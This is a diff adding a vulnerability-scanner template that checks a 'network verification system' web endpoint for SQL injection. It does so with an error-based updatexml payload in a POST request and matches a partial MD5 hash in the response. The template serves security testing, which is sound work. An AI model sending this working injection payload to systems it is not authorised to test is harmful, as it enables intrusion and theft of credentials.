@@ -1,0 +1,27 @@
+id: network-verification-system-sql-injection
+info:
+  name: Network Verification System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The network authentication system has a SQL injection vulnerability that attackers can use to obtain sensitive information such as administrator passwords, allowing them to further control the server.
+  tags: sql-injection
+  reference:
+    - https://fofa.so
+http:
+  - raw:
+      - |
+        POST /index.php/api/Software/getInfo HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b7"
+        part: body
